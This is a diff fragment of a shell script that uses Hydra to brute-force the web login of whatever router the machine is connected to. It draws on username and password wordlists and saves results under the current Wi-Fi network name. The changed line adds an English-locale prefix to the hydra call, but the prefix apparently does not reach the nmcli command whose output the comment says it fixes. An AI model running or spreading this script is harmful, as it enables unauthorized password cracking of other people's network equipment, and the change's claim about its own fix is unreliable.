@@ -29,8 +29,8 @@ user_directory="./user_hydra"
 password_directory="./wordlists"
 router_passwords="./router_passwords"
 
-#WARNING: nmcli has language packet, so in some country the command could not work!   (somewhere "no" could be written in different way)
-hydra -L $user_directory -P $password_directory -o "${router_passwords}/`nmcli -t -f active,ssid dev wifi | grep -v no | cut -d ':' -f2`" `ip route show | head -n 1 | cut -d ' ' -f 3` http   #this way is not elegant
+# Explicitly run hydra with english locale such that grep -v no works on localized systems too
+LANG=en_US.UTF-8 hydra -L $user_directory -P $password_directory -o "${router_passwords}/`nmcli -t -f active,ssid dev wifi | grep -v no | cut -d ':' -f2`" `ip route show | head -n 1 | cut -d ' ' -f 3` http   #this way is not elegant
 # -t4 -f -w5 
 exit 0
 
